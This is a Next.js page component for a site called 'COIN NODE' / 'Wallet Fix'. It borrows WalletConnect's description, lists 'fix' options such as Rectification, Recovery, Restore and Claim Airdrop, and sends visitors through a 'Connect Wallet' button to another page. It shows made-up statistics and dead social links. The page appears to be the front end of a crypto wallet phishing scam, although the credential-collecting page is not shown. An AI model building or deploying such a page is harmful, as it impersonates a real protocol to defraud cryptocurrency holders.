"use client"
import { useRouter } from "next/navigation"
import { CryptoTicker } from "@/components/crypto-ticker"
import { QuickStartCard } from "@/components/quick-start-card"
import { Github, Twitter, DiscIcon as Discord, TextIcon as Telegram } from "lucide-react"

export default function Home() {
  const router = useRouter()

  const handleConnectWallet = () => {
    router.push("/connect-wallet")
  }

  return (
    <div className="min-h-screen bg-[#0d111a] text-white flex flex-col">
      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 py-12">
        {/* Logo and Description */}
        <div className="text-center max-w-3xl mx-auto mb-12">
          <h1 className="text-5xl font-bold mb-8">COIN NODE</h1>
          <p className="text-md mb-2">
            COIN NODE is an open protocol to communicate securely between Wallets and Dapps (Web3 Apps).
          </p>
          <p className="text-lg mb-8">The protocol establishes a remote connection using a Bridge server.</p>

          {/* Action Buttons */}
          <div className="flex justify-center gap-4 mb-16">
            <button
              className="bg-[#1a2235] hover:bg-[#232d42] text-white px-8 py-3 rounded-md transition-colors"
              onClick={handleConnectWallet}
            >
              Connect Wallet
            </button>
            <button className="bg-[#1a2235] hover:bg-[#232d42] text-white px-8 py-3 rounded-md transition-colors">
              Collab.Join
            </button>
          </div>
        </div>

        {/* Crypto Ticker */}
        <div className="w-full max-w-5xl mb-16">
          <CryptoTicker />
        </div>

        {/* Quick Start Section */}
        <div className="w-full max-w-7xl mb-20">
          <h2 className="text font-semibold text-center text-[#4a8eff] mb-8">Quick Start</h2>

          <div className="grid grid-cols-1 md:grid-cols-2 sm:px-10 text-center lg:grid-cols-3 gap-6">
            <QuickStartCard title="Migration" />
            <QuickStartCard title="Validate" />
            <QuickStartCard title="Restore" />
            <QuickStartCard title="Stake" />
            <QuickStartCard title="Swapping" />
            <QuickStartCard title="Buying" />
            <QuickStartCard title="Staking review" />
            <QuickStartCard title="Reflection" />
            <QuickStartCard title="Syncronize" />
            <QuickStartCard title="Unstake Tokens" />
            <QuickStartCard title="Claim Airdrop Rewards" />
            <QuickStartCard title="Airdrop" />
            <QuickStartCard title="Bridge" />
            <QuickStartCard title="Claim" />
            <QuickStartCard title="Rectification" />
            <QuickStartCard title="Recovery" />
            <QuickStartCard title="Harvest my stakings" />
            <QuickStartCard title="Withdrawal" />
            <QuickStartCard title="Gas" />
            <QuickStartCard title="LP Lock" />
            <QuickStartCard title="Restore Tokens" />
            <QuickStartCard title="NFT Mint" />
            <QuickStartCard title="Purase Tokens" />
            <QuickStartCard title="NFT Mint" />
            <QuickStartCard title="Purchase Tokens" />
            <QuickStartCard title="NFT Mint" />
            <QuickStartCard title="Other's" />
          </div>
        </div>

        {/* Distribution Section */}
        <div className="w-full max-w-5xl mb-20">
          <h2 className="text-2xl font-semibold text-[#4a8eff] text-center mb-12">Distribution</h2>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-center">
            <div className="flex flex-col items-center">
              <h3 className="text-4xl font-bold mb-2">50K+</h3>
              <p className="text-gray-400">active wallets</p>
            </div>

            <div className="flex flex-col items-center">
              <h3 className="text-4xl font-bold mb-2">200k+</h3>
              <p className="text-gray-400">resolved issues</p>
            </div>

            <div className="flex flex-col items-center">
              <h3 className="text-4xl font-bold mb-2">100+</h3>9
              <p className="text-gray-400">contributors</p>
            </div>
          </div>
        </div>

        {/* Call to Action */}
        <div className="w-full max-w-3xl text-center mb-16">
          <h3 className="text-xl mb-2">Ready to resolve your blockchain issues?</h3>
          <p className="text-gray-400 mb-6">We are here to provide help.</p>
          <button className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded-md transition-colors">
            Get Started
          </button>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-[#0a0d14] py-8">
        <div className="max-w-5xl mx-auto px-4">
          <div className="flex justify-center space-x-6 mb-6">
            <a href="#" className="text-gray-400 hover:text-white transition-colors">
              <Github className="w-6 h-6" />
            </a>
            <a href="#" className="text-gray-400 hover:text-white transition-colors">
              <Twitter className="w-6 h-6" />
            </a>
            <a href="#" className="text-gray-400 hover:text-white transition-colors">
              <Discord className="w-6 h-6" />
            </a>
            <a href="#" className="text-gray-400 hover:text-white transition-colors">
              <Telegram className="w-6 h-6" />
            </a>
          </div>
          <div className="text-center text-gray-500 text-sm">Wallet Fix © 2022 All rights reserved.</div>
        </div>
      </footer>
    </div>
  )
}

